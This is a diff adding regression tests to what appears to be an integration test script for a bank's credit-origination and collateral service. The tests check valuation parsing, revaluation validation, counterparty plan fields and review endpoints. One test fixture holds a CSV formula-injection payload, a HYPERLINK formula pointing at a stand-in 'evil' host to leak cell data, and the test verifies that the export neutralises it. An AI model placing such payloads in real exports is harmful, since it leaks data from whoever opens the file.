@@ -1150,6 +1150,13 @@ check("valuation extraction parsed market value + valuer + date",
       str(list(col_ex.get("fields", {}).keys())))
 check("missingMandatory list surfaces gaps explicitly",
       isinstance(col_ex.get("missingMandatory"), list), str(col_ex.get("missingMandatory")))
+# Indian-format grouping (4,80,00,000 = 4.8 crore = 48,000,000) must parse correctly —
+# regression check: the original MONEY regex only accepted US/UK groupings of three.
+mv_field = col_ex["fields"].get("marketValue", {})
+mv_val = mv_field.get("value") if isinstance(mv_field, dict) else None
+check("Indian-format money (4,80,00,000) parses as a number, not a raw string",
+      isinstance(mv_val, (int, float)) and abs(mv_val - 48000000) < 1,
+      f"marketValue.value = {mv_val!r}")
 
 # 45c. Confirm — materialises a real collateral via the same path analysts use
 st, col_made = call("POST", f"/origination/api/collateral-intel/extractions/{col_ex['id']}/confirm",
@@ -1259,6 +1266,36 @@ check("charge-Excel header + per-collateral rows",
       and any(f",{collateral_id}," in l for l in csv_lines),
       f"lines={len(csv_lines)} first={csv_lines[0][:60] if csv_lines else ''}")
 
+# 45j.1 CSV / formula-injection defang — register collateral whose description starts
+# with a formula trigger and verify the export prefixes it with a single apostrophe.
+st, evil_col = call("POST", f"/origination/api/applications/{ref}/collaterals",
+                    {"collateralType": "PROPERTY",
+                     "description": "=HYPERLINK(\"http://evil/?leak=A1\",\"click\")",
+                     "marketValue": 1000000.0, "haircut": 0.5,
+                     "perfectionStatus": "IN_PROGRESS"}, actor="analyst.user")
+check("collateral with formula-trigger description created (test fixture)", st == 200, f"{st}")
+req_csv2 = urllib.request.Request(f"{gw}/origination/api/collateral-intel/{ref}/charge-excel",
+                                  headers={"X-Actor": "credit.ops"})
+with urllib.request.urlopen(req_csv2, timeout=30) as r:
+    csv2_body = r.read().decode()
+check("CSV injection defanged — formula-trigger cell prefixed with apostrophe",
+      "'=HYPERLINK" in csv2_body and "\n=HYPERLINK" not in csv2_body
+      and ",=HYPERLINK" not in csv2_body,
+      "raw =HYPERLINK leaked into CSV output")
+
+# 45j.2 LTV-wipeout rejection: revaluations with newMarketValue <= 0 must 400, not
+# persist an incoherent ltvAfter=0 + BREACH row.
+st, wipe = call("POST", f"/origination/api/collateral-intel/collaterals/{collateral_id}/revalue",
+                {"newMarketValue": 0, "drawnExposure": 24000000,
+                 "trigger": "VALUATION_UPDATE"}, actor="risk.officer")
+check("newMarketValue <= 0 rejected (400) — wipeout routes through write-off path",
+      st == 400, f"{st}")
+# Invalid effectiveDate -> 400 (not 500)
+st, bad_date = call("POST", f"/origination/api/collateral-intel/collaterals/{collateral_id}/revalue",
+                    {"newMarketValue": 30000000, "drawnExposure": 1000000,
+                     "effectiveDate": "31/12/2026", "trigger": "VALUATION_UPDATE"}, actor="risk.officer")
+check("invalid effectiveDate rejected (400, not 500)", st == 400, f"{st}")
+
 # 45k. INVARIANT — authoritative rating untouched by collateral intelligence
 st, post_col = call("GET", f"/risk/api/risk/{ref}")
 check("AUTHORITATIVE rating UNCHANGED by collateral extraction + revaluation",
@@ -1279,6 +1316,13 @@ check("CPT generated (v1, DRAFT, advisory)",
       and cpt1["advisory"] is True and cpt1["counterpartyReference"] == cp["reference"], f"{st}")
 check("CPT pulls live application count (Meridian has ≥1 application)",
       cpt1["applicationCount"] >= 1, f"appCount={cpt1.get('applicationCount')}")
+# CPT must resolve the real group reference for tagged counterparties — not the synthetic
+# "GROUP_ID:<numeric>" placeholder that was emitted before the groupByIdOrNull lookup landed.
+# Meridian was tagged to `grp` in §43, so the CPT here should carry grp.reference.
+check("CPT carries the real group reference (not a synthetic GROUP_ID placeholder)",
+      cpt1.get("groupReference") == grp["reference"]
+      and "GROUP_ID:" not in (cpt1.get("groupReference") or ""),
+      f"groupReference={cpt1.get('groupReference')!r}")
 check("CPT carries exposure-weighted figures (PD + RAROC + latestGrade)",
       cpt1.get("weightedAveragePd") is not None
       and cpt1.get("weightedAverageRaroc") is not None
@@ -1310,6 +1354,18 @@ check("BEST_CASE delta > MOST_LIKELY delta > WORST_CASE delta",
       > next(s["deltaPct"] for s in scenarios if s["label"] == "MOST_LIKELY")
       > next(s["deltaPct"] for s in scenarios if s["label"] == "WORST_CASE"),
       str([(s["label"], s["deltaPct"]) for s in scenarios]))
+# Wallet sizing must actually project revenue from financials (regression: ratios
+# map doesn't carry raw EBITDA / REVENUE — base revenue has to be read from
+# env.latestFinancials directly, not approxRevenueFromRatios).
+check("wallet sizing produces non-null projected revenue paths from spread financials",
+      ws.get("baseRevenue") is not None and ws["baseRevenue"] > 0
+      and all("projectedRevenue" in s and isinstance(s["projectedRevenue"], list)
+              and len(s["projectedRevenue"]) == 3 for s in scenarios),
+      f"baseRevenue={ws.get('baseRevenue')} firstPath={scenarios[0].get('projectedRevenue') if scenarios else None}")
+check("indicative wallet is derived (heuristic, not null) when base revenue is known",
+      ws.get("indicativeWallet") is not None
+      and ws["indicativeWallet"].get("amount", 0) > 0,
+      str(ws.get("indicativeWallet")))
 
 # 46d. Industry insights — sector-aware
 ind = cpt1.get("industryInsights") or {}
@@ -1352,14 +1408,14 @@ st, vers = call("GET", f"/decision/api/cpt/{cp['reference']}/versions")
 check("CPT version history exposed", st == 200 and len(vers) >= 2 and vers[0]["version"] > vers[1]["version"], f"{st}")
 
 # 46h. Human gate — RM approves
-st, conf = call("POST", f"/decision/api/cpt/{cpt2['id']}/review",
+st, conf = call("POST", f"/decision/api/cpt/templates/{cpt2['id']}/review",
                 {"approve": True, "note": "concur with plan"}, actor="rm.user")
 check("CPT confirmed -> CONFIRMED", st == 200 and conf["status"] == "CONFIRMED", f"{st}")
-st, reconf = call("POST", f"/decision/api/cpt/{cpt2['id']}/review",
+st, reconf = call("POST", f"/decision/api/cpt/templates/{cpt2['id']}/review",
                   {"approve": True}, actor="rm.user")
 check("re-review rejected (already CONFIRMED, 409)", st == 409, f"{st}")
 # Reject path on v1
-st, rej = call("POST", f"/decision/api/cpt/{cpt1['id']}/review",
+st, rej = call("POST", f"/decision/api/cpt/templates/{cpt1['id']}/review",
                {"approve": False, "note": "superseded"}, actor="rm.user")
 check("CPT v1 rejected -> REJECTED", st == 200 and rej["status"] == "REJECTED", f"{st}")
 
